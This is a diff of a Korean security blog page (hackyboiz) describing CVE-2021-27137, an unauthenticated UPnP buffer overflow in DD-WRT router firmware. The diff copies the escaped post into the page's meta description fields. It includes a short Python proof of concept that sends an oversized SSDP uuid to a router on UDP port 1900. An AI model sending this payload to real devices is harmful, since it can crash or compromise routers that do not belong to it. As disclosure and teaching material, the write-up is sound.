@@ -13,15 +13,59 @@
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="hack &amp; life">
+  <meta name="description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/&#34;&gt;SSD Advisory &amp;#x2013; DD-WRT UPNP Buffer Overflow&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;DD-WRT&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xB9AC;&amp;#xB205;&amp;#xC2A4; &amp;#xAE30;&amp;#xBC18;&amp;#xC758; &amp;#xBB34;&amp;#xC120; &amp;#xB77C;&amp;#xC6B0;&amp;#xD130; &amp;#xBC0F; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD3EC;&amp;#xC778;&amp;#xD2B8; &amp;#xD38C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC778; DD-WRT&amp;#xC5D0;&amp;#xC11C; &amp;#xC778;&amp;#xC99D;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &amp;#xBC84;&amp;#xD37C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; Code Execution&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Universal Plug and Play(UPNP)&amp;#xB294; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;, &amp;#xD504;&amp;#xB9B0;&amp;#xD130;, &amp;#xC778;&amp;#xD130;&amp;#xB137; &amp;#xAC8C;&amp;#xC774;&amp;#xD2B8;&amp;#xC6E8;&amp;#xC774;, &amp;#xC640;&amp;#xC774;&amp;#xD30C;&amp;#xC774; access point, &amp;#xBAA8;&amp;#xBC14;&amp;#xC77C; &amp;#xC7A5;&amp;#xCE58;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xC7A5;&amp;#xCE58;&amp;#xB4E4;&amp;#xC774; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C;&amp;#xC5D0;&amp;#xC11C; &amp;#xC11C;&amp;#xB85C;&amp;#xB97C; &amp;#xD0D0;&amp;#xC0C9;&amp;#xD558;&amp;#xACE0; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC81C;&amp;#xACF5;&amp;#xD558;&amp;#xB294; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xD504;&amp;#xB85C;&amp;#xD1A0;&amp;#xCF5C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAE30;&amp;#xBCF8; &amp;#xC124;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; DD-WRT&amp;#xC758; UPNP&amp;#xB294; &amp;#xBE44;&amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. UPNP&amp;#xB294; UDP &amp;#xD615;&amp;#xC2DD;&amp;#xC758; &amp;#xC778;&amp;#xC99D;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xD504;&amp;#xB85C;&amp;#xD1A0;&amp;#xCF5C;&amp;#xB85C; DD-WRT&amp;#xC5D0; UPNP &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB41C; &amp;#xACBD;&amp;#xC6B0; DD-WRT&amp;#xC758; LAN&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; &amp;#xD070; &amp;#xD06C;&amp;#xAE30;&amp;#xC758; &lt;code&gt;uuid&lt;/code&gt; &amp;#xAC12;&amp;#xC744; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xC5EC; &amp;#xBC84;&amp;#xD37C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;ssdp.c&lt;/code&gt; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ssd-disclosure.com/wp-content/uploads/2021/03/image-1024x590.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;name &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB294; 128 bytes&amp;#xC774;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xB54C; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD06C;&amp;#xAE30; &amp;#xAC12;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC80;&amp;#xC99D;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544;&amp;#xC11C; &amp;#xBC84;&amp;#xD37C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; POC&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+target_ip = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;192.168.15.124&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# IP Address of Target&lt;/span&gt;
+off = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;D&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;164&lt;/span&gt;
+ret_addr = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt; 
+payload = off + ret_addr
+packet = \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;M-SEARCH * HTTP/1.1\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;HOST:239.255.255.250:1900\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;ST:uuid:&amp;apos;&lt;/span&gt;+payload+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;MX:2\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;MAN:&amp;quot;ssdp:discover&amp;quot;\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\r\n&amp;apos;&lt;/span&gt;
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+s.sendto(packet.encode(), (target_ip, &lt;span class=&#34;hljs-number&#34;&gt;1900&lt;/span&gt;) )&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
   <meta name="author" content="j0dev, y2sman">
   <meta name="keywords" content>
   <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">
 
   <meta property="og:type" content="website"> 
   <meta property="og:title" content="[하루한줄] CVE-2021-27137: DD-WRT UPNP Buffer Overflow - hackyboiz">
-  <meta property="og:description" content="hack &amp; life">
-  <meta property="og:image" content="/img/favicon.ico">
+  <meta property="og:description" content="&lt;h2 id=&#34;URL&#34;&gt;&lt;a href=&#34;#URL&#34; class=&#34;headerlink&#34; title=&#34;URL&#34;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://ssd-disclosure.com/ssd-advisory-dd-wrt-upnp-buffer-overflow/&#34;&gt;SSD Advisory &amp;#x2013; DD-WRT UPNP Buffer Overflow&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;DD-WRT&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;Explain&#34;&gt;&lt;a href=&#34;#Explain&#34; class=&#34;headerlink&#34; title=&#34;Explain&#34;&gt;&lt;/a&gt;Explain&lt;/h2&gt;&lt;p&gt;&amp;#xB9AC;&amp;#xB205;&amp;#xC2A4; &amp;#xAE30;&amp;#xBC18;&amp;#xC758; &amp;#xBB34;&amp;#xC120; &amp;#xB77C;&amp;#xC6B0;&amp;#xD130; &amp;#xBC0F; &amp;#xC561;&amp;#xC138;&amp;#xC2A4; &amp;#xD3EC;&amp;#xC778;&amp;#xD2B8; &amp;#xD38C;&amp;#xC6E8;&amp;#xC5B4;&amp;#xC778; DD-WRT&amp;#xC5D0;&amp;#xC11C; &amp;#xC778;&amp;#xC99D;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xC0AC;&amp;#xC6A9;&amp;#xC790;&amp;#xAC00; &amp;#xBC84;&amp;#xD37C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; Code Execution&amp;#xC744; &amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xB294; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xBC1C;&amp;#xACAC;&amp;#xB418;&amp;#xC5C8;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;Universal Plug and Play(UPNP)&amp;#xB294; &amp;#xCEF4;&amp;#xD4E8;&amp;#xD130;, &amp;#xD504;&amp;#xB9B0;&amp;#xD130;, &amp;#xC778;&amp;#xD130;&amp;#xB137; &amp;#xAC8C;&amp;#xC774;&amp;#xD2B8;&amp;#xC6E8;&amp;#xC774;, &amp;#xC640;&amp;#xC774;&amp;#xD30C;&amp;#xC774; access point, &amp;#xBAA8;&amp;#xBC14;&amp;#xC77C; &amp;#xC7A5;&amp;#xCE58;&amp;#xC640; &amp;#xAC19;&amp;#xC740; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xC7A5;&amp;#xCE58;&amp;#xB4E4;&amp;#xC774; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C;&amp;#xC5D0;&amp;#xC11C; &amp;#xC11C;&amp;#xB85C;&amp;#xB97C; &amp;#xD0D0;&amp;#xC0C9;&amp;#xD558;&amp;#xACE0; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4; &amp;#xAE30;&amp;#xB2A5;&amp;#xC744; &amp;#xC81C;&amp;#xACF5;&amp;#xD558;&amp;#xB294; &amp;#xB124;&amp;#xD2B8;&amp;#xC6CC;&amp;#xD06C; &amp;#xD504;&amp;#xB85C;&amp;#xD1A0;&amp;#xCF5C;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xAE30;&amp;#xBCF8; &amp;#xC124;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; DD-WRT&amp;#xC758; UPNP&amp;#xB294; &amp;#xBE44;&amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. UPNP&amp;#xB294; UDP &amp;#xD615;&amp;#xC2DD;&amp;#xC758; &amp;#xC778;&amp;#xC99D;&amp;#xB418;&amp;#xC9C0; &amp;#xC54A;&amp;#xC740; &amp;#xD504;&amp;#xB85C;&amp;#xD1A0;&amp;#xCF5C;&amp;#xB85C; DD-WRT&amp;#xC5D0; UPNP &amp;#xC11C;&amp;#xBE44;&amp;#xC2A4;&amp;#xAC00; &amp;#xD65C;&amp;#xC131;&amp;#xD654;&amp;#xB41C; &amp;#xACBD;&amp;#xC6B0; DD-WRT&amp;#xC758; LAN&amp;#xC5D0; &amp;#xC788;&amp;#xB294; &amp;#xD574;&amp;#xCEE4;&amp;#xAC00; &amp;#xD070; &amp;#xD06C;&amp;#xAE30;&amp;#xC758; &lt;code&gt;uuid&lt;/code&gt; &amp;#xAC12;&amp;#xC744; &amp;#xC804;&amp;#xC1A1;&amp;#xD558;&amp;#xC5EC; &amp;#xBC84;&amp;#xD37C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xB97C; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xB294; &lt;code&gt;ssdp.c&lt;/code&gt; &amp;#xCF54;&amp;#xB4DC;&amp;#xB294; &amp;#xB2E4;&amp;#xC74C;&amp;#xACFC; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://ssd-disclosure.com/wp-content/uploads/2021/03/image-1024x590.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
+&lt;p&gt;name &amp;#xBC84;&amp;#xD37C;&amp;#xC758; &amp;#xD06C;&amp;#xAE30;&amp;#xB294; 128 bytes&amp;#xC774;&amp;#xC9C0;&amp;#xB9CC;, &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBCF5;&amp;#xC0AC;&amp;#xD560; &amp;#xB54C; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD06C;&amp;#xAE30; &amp;#xAC12;&amp;#xC5D0; &amp;#xB300;&amp;#xD55C; &amp;#xAC80;&amp;#xC99D;&amp;#xC774; &amp;#xC874;&amp;#xC7AC;&amp;#xD558;&amp;#xC9C0; &amp;#xC54A;&amp;#xC544;&amp;#xC11C; &amp;#xBC84;&amp;#xD37C; &amp;#xC624;&amp;#xBC84;&amp;#xD50C;&amp;#xB85C;&amp;#xC6B0;&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xD574;&amp;#xB2F9; &amp;#xCDE8;&amp;#xC57D;&amp;#xC810;&amp;#xC758; POC&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xAC19;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs python&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; socket
+target_ip = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;192.168.15.124&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-comment&#34;&gt;# IP Address of Target&lt;/span&gt;
+off = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;D&amp;quot;&lt;/span&gt;*&lt;span class=&#34;hljs-number&#34;&gt;164&lt;/span&gt;
+ret_addr = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;AAAA&amp;quot;&lt;/span&gt; 
+payload = off + ret_addr
+packet = \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;M-SEARCH * HTTP/1.1\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;HOST:239.255.255.250:1900\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;ST:uuid:&amp;apos;&lt;/span&gt;+payload+&lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;MX:2\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;MAN:&amp;quot;ssdp:discover&amp;quot;\r\n&amp;apos;&lt;/span&gt; \
+    &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;\r\n&amp;apos;&lt;/span&gt;
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
+s.sendto(packet.encode(), (target_ip, &lt;span class=&#34;hljs-number&#34;&gt;1900&lt;/span&gt;) )&lt;/code&gt;&lt;/pre&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/img/1day1line.png">
   <meta property="og:url" content="https://hackyboiz.github.io/">
 
   <link rel="canonical" href="https://hackyboiz.github.io/2021/03/25/insu/2021-03-25/">
@@ -263,7 +307,6 @@ packet = \
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
 s.sendto(packet.encode(), (target_ip, <span class="hljs-number">1900</span>) )</code></pre>
 
-
             </div>
             <hr>
             <div>
@@ -280,13 +323,13 @@ s.sendto(packet.encode(), (target_ip, <span class="hljs-number">1900</span>) )</
                 <div class="post-meta">
                   <i class="iconfont icon-tags"></i>
                   
-                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
-                  
-                  <a class="hover-with-bg" href="/tags/bof/">bof</a>
-                  
                   <a class="hover-with-bg" href="/tags/insu/">insu</a>
                   
+                  <a class="hover-with-bg" href="/tags/cve/">cve</a>
+                  
                   <a class="hover-with-bg" href="/tags/dd-wrt/">dd-wrt</a>
+                  
+                  <a class="hover-with-bg" href="/tags/bof/">bof</a>
                   
                 </div>
                 
